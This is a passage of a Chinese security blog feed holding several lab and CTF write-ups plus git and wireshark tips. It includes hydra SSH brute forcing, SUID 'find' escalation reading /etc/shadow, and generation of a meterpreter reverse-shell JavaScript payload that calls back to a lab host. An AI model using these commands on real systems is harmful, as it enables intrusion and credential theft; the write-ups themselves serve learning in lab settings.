src="https://img-blog.csdnimg.cn/20190524065908178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这里还有一种做法，<br>我们刚开始如果发现了flag4 用户，可以尝试去爆破，我们推荐hydra这个神器，如果你没有爆破字典，可以把john的拿过来用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wxy@wxy-virtual-machine:~$ hydra -l flag4 -P /home/wxy/Desktop/password_dict/Weak_password.txt ssh://192.168.248.152</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190524070708516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>爆破成功后，我们尝试登录拿到flag4</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wxy@wxy-virtual-machine:~$ ssh flag4@192.168.248.152</span><br><span class="line">flag4@DC-1:~$ ls</span><br><span class="line">flag4@DC-1:~$ cat flag4.txt</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190524070854357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="最终flag"><a href="#最终flag" class="headerlink" title="最终flag"></a>最终flag</h2><p>我们已经知道了find的特殊之处，使用find去获取shadow文件。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ find / -name wxy -exec "/bin/sh" \;</span><br><span class="line"># cat /etc/shadow</span><br><span class="line">或者</span><br><span class="line">www-data@DC-1:/etc$ find /etc/shadow -exec cat &#123;&#125; \;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190524072046561.png" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20190524072409895.png" alt="在这里插入图片描述">我们尝试去解密，linux对密码是sha256的加密方式</p><p>如果密码比较复杂，解密是费时有可能解不出来，我们查看对shadow的权限<br>发现root对其具有写权限，这里我们备份一份shadow，然后直接改里面的值，去登录<br><img src="https://img-blog.csdnimg.cn/20190524073726571.png" alt="在这里插入图片描述"><br>ps：这里想了几种办法都没用，大佬有更加骚的姿势，欢迎指点</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>重点是find提权<br>下来就是各种工具的熟练掌握</p><hr><p>永远不要停下你的步伐</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;DC-1 学习&lt;/p&gt;
    
    </summary>
    
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="Suid 提权" scheme="http://yoursite.com/tags/Suid-%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>解决wireshark没有捕获端口的问题</title>
    <link href="http://yoursite.com/2019/10/04/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/%E8%A7%A3%E5%86%B3wireshark%E6%B2%A1%E6%9C%89%E6%8D%95%E8%8E%B7%E7%AB%AF%E5%8F%A3%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>http://yoursite.com/2019/10/04/实用技巧/解决wireshark没有捕获端口的问题/</id>
    <published>2019-10-04T02:55:33.000Z</published>
    <updated>2019-10-04T05:44:08.723Z</updated>
    
    <content type="html"><![CDATA[<p>流量捕获时发现没有端口解决方法</p><a id="more"></a><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>今天打开wireshark发现没有捕获的接口，然后查了下需要开启npf<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/12/20190712125750.png" alt></p><p>1 以管理员模式启动cmd<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/12/20190712125903.png" alt></p><p>2 输入命令 <code>net start npf</code><br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/12/20190712125750.png" alt></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/12/20190712130050.png" alt></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/12/20190712130142.png" alt></p><hr><p>希望可以帮助到各位小伙伴</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;流量捕获时发现没有端口解决方法&lt;/p&gt;
    
    </summary>
    
    
      <category term="实用技巧" scheme="http://yoursite.com/categories/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="wireshark" scheme="http://yoursite.com/tags/wireshark/"/>
    
  </entry>
  
  <entry>
    <title>利用js文件反弹shell</title>
    <link href="http://yoursite.com/2019/10/04/web%E5%AE%89%E5%85%A8/shell/%E5%88%A9%E7%94%A8js%E6%96%87%E4%BB%B6%E5%8F%8D%E5%BC%B9shell/"/>
    <id>http://yoursite.com/2019/10/04/web安全/shell/利用js文件反弹shell/</id>
    <published>2019-10-04T02:53:56.000Z</published>
    <updated>2019-10-04T05:39:55.852Z</updated>
    
    <content type="html"><![CDATA[<p>根据Jaky老哥的文章 复现一下反弹shell</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇文章是按照大佬的文章复现<br>本文只用于测试，请不要将其用于非法途径<br>公众号： 洛米唯熊</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>攻击： kali<pre><code>ip: 192.168.248.132</code></pre></li><li>测试： windows 7 x64<pre><code>ip: 192.168.248.136</code></pre><h1 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h1><a href="https://github.com/CroweCybersecurity/ps1encode" target="_blank" rel="noopener">https://github.com/CroweCybersecurity/ps1encode</a><h1 id="克隆"><a href="#克隆" class="headerlink" title="克隆"></a>克隆</h1>在kali克隆工具<br>命令：<code>git clone https://github.com/CroweCybersecurity/ps1encode.git</code></li></ul><h1 id="生成js脚本"><a href="#生成js脚本" class="headerlink" title="生成js脚本"></a>生成js脚本</h1><p>命令：<code>./pslencode.rb --LHOST 192.168.248.132 --LPORT 4444 --PAYLOAD windows/meterpreter/reverse_tcp --ENCODE cmd -t js</code><br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E7%94%9F%E6%88%90js%E8%84%9A%E6%9C%AC2.png" alt></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E7%94%9F%E6%88%90.png" alt></p><blockquote><p> 复制文本放到文件中生成1.js文件</p></blockquote><h1 id="监听端口反弹shell"><a href="#监听端口反弹shell" class="headerlink" title="监听端口反弹shell"></a>监听端口反弹shell</h1><p><img src="https://img-blog.csdnimg.cn/20190707191042260.png" alt="在这里插入图片描述"></p><h1 id="windows执行文件"><a href="#windows执行文件" class="headerlink" title="windows执行文件"></a>windows执行文件</h1><p>直接执行的话可能比较明显，所以参照文章我们写了一个1.html文件<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/windows%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6.png" alt><br>执行1.html文件，选择运行-&gt;允许阻止内容-&gt;选择是，就反弹成功了<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%89%A7%E8%A1%8C.png" alt><br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E5%85%81%E8%AE%B8%E8%84%9A%E6%9C%AC.png" alt></p><h1 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h1><h2 id><a href="#" class="headerlink" title></a><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E7%9B%91%E5%90%AC%E6%8E%A5%E5%8F%A3%E5%8F%8D%E5%BC%B9shell2.png" alt></h2><p>复现完成，过程简单，值得一学</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;根据Jaky老哥的文章 复现一下反弹shell&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://yoursite.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="反弹shell" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BC%B9shell/"/>
    
  </entry>
  
  <entry>
    <title>删除github的某个文件</title>
    <link href="http://yoursite.com/2019/10/04/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/%E5%88%A0%E9%99%A4github%E7%9A%84%E6%9F%90%E4%B8%AA%E6%96%87%E4%BB%B6/"/>
    <id>http://yoursite.com/2019/10/04/实用技巧/删除github的某个文件/</id>
    <published>2019-10-04T02:52:35.000Z</published>
    <updated>2019-10-04T05:44:33.962Z</updated>
    
    <content type="html"><![CDATA[<p>搭建图床的时候，位置弄错不会删除，这里总结一下</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>今天用github做图床，上传的文件没有改名字并且都在同一个文件中散乱，然后想要删除的时候发现没有删除的选项。</p><p>然后百度了下相关的内容，并把操作记录以备查看，并给和我一样不会的小伙伴们一个参考</p></blockquote><h2 id="开始前的准备"><a href="#开始前的准备" class="headerlink" title="开始前的准备"></a>开始前的准备</h2><p>首先看看我现在的情况</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%9B%B4%E6%94%B9%E5%89%8D%E7%9A%84%E6%83%85%E5%86%B5.png" alt></p><p>之后我们需要有git这个软件支持，我这里用的是<code>Git-2.21.0-64-bit.exe</code>这个版本</p><p>附上下载地址：<a href="https://git-scm.com/download/" target="_blank" rel="noopener">git官方下载地址</a></p><p>git的安装比较简单，如果需要过程请参考网上的教程，这里就不多说了</p><p>下载好之后，鼠标右键就可以打开<code>git bash here</code></p><h2 id="删除不需要的文件"><a href="#删除不需要的文件" class="headerlink" title="删除不需要的文件"></a>删除不需要的文件</h2><p>1 如果是刚下载git的请跟着下面的步骤走，</p><p>首先先配置自己的git信息，</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E5%88%9A%E4%B8%8B%E8%BD%BDgit%E7%9A%84%E5%88%9D%E5%A7%8B%E6%AD%A5%E9%AA%A4.png" alt></p><p>之后初始化，在设置自己的</p><p>2 首先需要把github的项目拉倒本地，如果刚下载git请移步第一步</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1 添加origin  </span><br><span class="line">如果有.git 就不需要 git init  </span><br><span class="line">$ git init  </span><br><span class="line">$ git remote add origin git@github.com:ST0new/picture.git  </span><br><span class="line">2 拉取github文件  </span><br><span class="line">$ git pull origin master   </span><br><span class="line">3 查看文件  </span><br><span class="line">$ dir  </span><br><span class="line">4 删除不需要的文件  </span><br><span class="line">$ git rm -r --cached 0n7nye49.bmp  </span><br><span class="line">5 添加说明  </span><br><span class="line">$ git commit -m '删除了 0n7nye49.bmp '  </span><br><span class="line">6 更新github仓库  </span><br><span class="line">$ git add .  </span><br><span class="line">$ git push -u origin master</span><br></pre></td></tr></table></figure><p>拉取github上的文件</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/github%E6%8B%89%E5%8F%96%E6%96%87%E4%BB%B6.png" alt></p><p>输入dir查看目录</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%8B%89%E5%8F%96%E4%B8%8B%E6%9D%A5%E6%9F%A5%E7%9C%8B.png" alt></p><p>选择不需要的文件删除</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/dir%E6%9F%A5%E7%9C%8B%E7%9B%AE%E5%BD%95.png" alt></p><p>提交添加声明</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%8F%90%E4%BA%A4%E6%B7%BB%E5%8A%A0%E5%A3%B0%E6%98%8E.png" alt></p><p>更新远程仓库</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%9B%B4%E6%96%B0%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93.png" alt></p><p>查看</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%9F%A5%E7%9C%8B%E6%9B%B4%E6%96%B0%E5%90%8E%E7%9A%84%E5%86%85%E5%AE%B9.png" alt></p><h3 id="报错1-没有初始化"><a href="#报错1-没有初始化" class="headerlink" title="报错1 没有初始化"></a>报错1 没有初始化</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin master</span><br><span class="line">fatal: not a git repository (or any of the parent directories): .git</span><br></pre></td></tr></table></figure><p>解决：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%B2%A1%E6%9C%89%E5%88%9D%E5%A7%8B%E5%8C%96.png" alt></p><h3 id="报错2-添加远程库失败"><a href="#报错2-添加远程库失败" class="headerlink" title="报错2 添加远程库失败"></a>报错2 添加远程库失败</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git remote add origin git@github:ST0new/picture</span><br><span class="line">fatal: remote origin already exists.</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190710083208278.png" alt="在这里插入图片描述"></p><p>解决：删除重新添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git remote rm origin</span><br><span class="line">$ git remote add origin git@github.com:ST0new/picture.git</span><br></pre></td></tr></table></figure><hr><p>希望能解决你的问题</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;搭建图床的时候，位置弄错不会删除，这里总结一下&lt;/p&gt;
    
    </summary>
    
    
      <category term="实用技巧" scheme="http://yoursite.com/categories/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="文件删除" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/"/>
    
  </entry>
  
  <entry>
    <title>错误提示【URL file-access is disabled in the server configuration in】解决</title>
    <link href="http://yoursite.com/2019/10/04/web%E5%AE%89%E5%85%A8/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2019/10/04/web安全/远程文件包含/远程文件包含错误解决方法/</id>
    <published>2019-10-04T02:47:16.000Z</published>
    <updated>2019-10-04T05:40:16.168Z</updated>
    
    <content type="html"><![CDATA[<p>DVWA 初体验 远程文件包含错误，需要开启<strong>allow_url_include</strong>或者<strong>allow_url_ fopen</strong></p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天在做dvwa的file inclusion，发现远程 文件包含出错</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>可以看到提示的服务器配置中禁用url文件访问。<br><code>Warning: include() [function.include]: URL file-access is disabled in the server configuration in /var/www/dvwa/vulnerabilities/fi/index.php on line 35</code><br><img src="https://img-blog.csdnimg.cn/20190520194643142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol><li><p>在linux中搜索php.ini文件  </p><p> 命令：<code>find / -name php.ini</code><br><img src="https://img-blog.csdnimg.cn/20190520195041822.png" alt="在这里插入图片描述">我们去修改<code>/etc/php5/cgi/php,ini</code></p></li><li><p>vim 打开文件 <code>vim /etc/php5/cgi/php.ini</code><br><img src="https://img-blog.csdnimg.cn/20190520195551210.png" alt="在这里插入图片描述"></p></li><li><p>搜索关键字<code>allow_url_include或者allow_url_ fopen</code>设置两个都为<code>On</code><br> 可以发现<code>allow_url_include为off</code> 我们修改它为<code>On</code><br><img src="https://img-blog.csdnimg.cn/20190520195846677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>重新尝试远程访问，访问成功。<br><img src="https://img-blog.csdnimg.cn/2019052020005065.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ol><hr><h2 id="自己遇到的坑"><a href="#自己遇到的坑" class="headerlink" title="自己遇到的坑"></a>自己遇到的坑</h2><blockquote><p>当我发现问题的时候，我没有意识的修改的是php的php.ini，而是去查看了我的dvwa的php.ini 发现没有错误，自己研究了半天，才发现想错了，可以查看自己的dvwa下大的php发现是对的。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20190520200259826.png" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;DVWA 初体验 远程文件包含错误，需要开启&lt;strong&gt;allow_url_include&lt;/strong&gt;或者&lt;strong&gt;allow_url_ fopen&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://yoursite.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="远程文件包含" scheme="http://yoursite.com/tags/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>实验吧-隐写-欢迎来到地狱</title>
    <link href="http://yoursite.com/2019/10/04/CTF/%E5%AE%9E%E9%AA%8C%E5%90%A7/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E9%9A%90%E5%86%99-%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E5%9C%B0%E7%8B%B1/"/>
    <id>http://yoursite.com/2019/10/04/CTF/实验吧/实验吧-隐写-欢迎来到地狱/</id>
    <published>2019-10-04T02:44:30.000Z</published>
    <updated>2019-10-04T02:46:09.620Z</updated>
    
    <content type="html"><![CDATA[<p>多重隐写+加密，需要清醒的认识，才能不坠入地狱</p><a id="more"></a><h1 id="实验吧"><a href="#实验吧" class="headerlink" title="实验吧"></a>实验吧</h1><h2 id="隐写题"><a href="#隐写题" class="headerlink" title="隐写题"></a>隐写题</h2><h3 id="欢迎来到地狱"><a href="#欢迎来到地狱" class="headerlink" title="欢迎来到地狱"></a>欢迎来到地狱</h3><ol><li><p>解压</p><p>访问url，获取一个zip文件，解压发现存在3个文件 分别是jpg，doc，zip</p><p>根据文件名去，首先我们去打开第一个文件地狱伊始.jpg 打开提示文件错误。</p></li></ol><p><img src="https://upload-images.jianshu.io/upload_images/18851353-4f5b9c8d0c0ada24.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><pre><code>使用winhex打开查看，发现是jfif的文件，之后看到文件头标识不对，查询发现jfif的文件头是`FFD8FFFE00, .JPEG;.JPE;.JPG, &quot;JPGGraphic File&quot;` 我们添加文件头，方法：右键-&gt;edit-&gt;Paste zero bytes -&gt; 4 添加四个比特之后添加为![图片.png](https://upload-images.jianshu.io/upload_images/18851353-865de8c22816711b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)打开图片</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/18851353-ec5161d4032bdab8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><pre><code>图片链接失效，这里需要去隔壁wp里面找一个[https://pan.baidu.com/s/1i49Jhlj](https://pan.baidu.com/s/1i49Jhlj)注意这里的字母，打开是个音频</code></pre><ol start="2"><li><p>音频隐写</p><p>使用audacity.exe 打开文件，然后猜测可能是莫尔斯码</p><p><img src="https://upload-images.jianshu.io/upload_images/18851353-e928ef5cc6139bf2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p>101 0 1011 0100 0 1 001 000 110 111 通过对莫尔斯码对比得到密码</p><p>key letusgo</p></li><li><p>图片隐写</p><p>使用一个web网址上传图片直接出结果，这个参考评论，我使用stegsolve 没有查看到</p><p><a href="http://www.atool9.com/steganography.php" target="_blank" rel="noopener">http://www.atool9.com/steganography.php</a></p></li></ol><p><img src="https://upload-images.jianshu.io/upload_images/18851353-4329b373e9c8b879.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><pre><code>这里试了n久 没弄出来 ，之后查看了下wp 发现解密的信息错误,以下的为正确的 key{you are in finally hell now}这里和dalao商量了下，可能是图片的问题。终点有一个txt和一个图片，先看txt文档，0和1组成的可能是二进制，试试解字符串[![图片.png](https://upload-images.jianshu.io/upload_images/18851353-80915ee08664e99a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)ruokouling = 弱口令然后查看图片 地狱大门.jpg 使用winhex 打开，在最后看到有小姐姐.txt 文件 使用kali的foremost 分离</code></pre><p> <img src="https://upload-images.jianshu.io/upload_images/18851353-1d6b0f89f4cc437d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/18851353-8176f44aae59b878.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/18851353-6edb263d38578fb2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><pre><code>测试发现弱口令为Password</code></pre><p>   <img src="https://upload-images.jianshu.io/upload_images/18851353-93ef5c7e3d1d37c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><pre><code>VTJGc2RHVmtYMTlwRG9yWjJoVFArNXcwelNBOWJYaFZlekp5MnVtRlRTcDZQZE42elBLQ01BPT0=可能是base系列base64 解密一次 U2FsdGVkX19pDorZ2hTP+5w0zSA9bXhVezJy2umFTSp6PdN6zPKCMA==rabbit 解密 一次 fxbqrwrvnwmngrjxsrnsrnhx凯撒 解密一次 woshinimendexiaojiejieyo附上凯撒解密的脚本</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">​</span><br><span class="line">import os</span><br><span class="line">​</span><br><span class="line">str = &quot;fxbqrwrvnwmngrjxsrnsrnhx&quot;</span><br><span class="line">for i in range(0,26):</span><br><span class="line"> for j in str:</span><br><span class="line"> if ord(j) -i &gt;= 97:</span><br><span class="line"> print(chr(ord(j)-i),end=&quot;&quot;)</span><br><span class="line"> else:</span><br><span class="line"> print(chr(ord(j)-i+26),end=&quot;&quot;)</span><br><span class="line"> print()&lt;/pre&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li><p>flag</p><p>CTF{woshinimendexiaojiejieyo}</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;多重隐写+加密，需要清醒的认识，才能不坠入地狱&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>实验吧-逆向工程-debug</title>
    <link href="http://yoursite.com/2019/10/04/CTF/%E5%AE%9E%E9%AA%8C%E5%90%A7/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-debug/"/>
    <id>http://yoursite.com/2019/10/04/CTF/实验吧/实验吧-逆向工程-debug/</id>
    <published>2019-10-04T02:42:21.000Z</published>
    <updated>2019-10-04T02:44:06.863Z</updated>
    
    <content type="html"><![CDATA[<p>了解函数运行，合适添加断点判断，获取一闪而过的flag</p><a id="more"></a><h1 id="实验吧"><a href="#实验吧" class="headerlink" title="实验吧"></a>实验吧</h1><h2 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h2><h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><ol><li>下载文件，然后用idaq打开，<br><img src="https://upload-images.jianshu.io/upload_images/18851353-bcffaf7509872cfa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li></ol><pre><code>尝试在linux下打开发现么没有返回值，在idaq里面去查看shift+F12 查看字符串，发现有个printing flag这里想着如何可以进去，</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/18851353-4a18b4c4c1542a79.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><pre><code>可以看到其实位置在0x804849b</code></pre><ol start="2"><li><p>设置断点，查看</p><p>一般设置在main 但是main没有定义</p><p>[图片上传失败…(image-12bd86-1566818035404)] </p><p>这里查了下发现这几个可以代替</p><p>程序启动的过程应该是这样的：</p><p>_start -&gt; __libc_start_main -&gt; main. 具体一点就是：</p><p>_start -&gt; <strong>libc_start_main -&gt;</strong> libc_csu_init -&gt; main. 再具体一点就是：</p><p>_start -&gt; <strong>libc_start_main -&gt;</strong> libc_csu_init -&gt; _init -&gt; main -&gt; _fini.</p><p>官方点的解释：__libc_start_main sets up the environment and then calls the <code>main()</code> function when the binary is run.</p><p>所以我们设置在libc_start_main 也可以达到相同的效果</p></li><li><p>获取flag<br><img src="https://upload-images.jianshu.io/upload_images/18851353-2ac2fd5eab49c9f4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p></li></ol><pre><code>设置入口</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/18851353-9dc087b284760cc3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><pre><code>运行，之后在设置断点 ， 先 r 在 set $eip=0x804849b</code></pre><p>  <img src="https://upload-images.jianshu.io/upload_images/18851353-7f80c2c362487886.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><pre><code>成功拿到flag</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;了解函数运行，合适添加断点判断，获取一闪而过的flag&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="reverse" scheme="http://yoursite.com/tags/reverse/"/>
    
  </entry>
  
</feed>
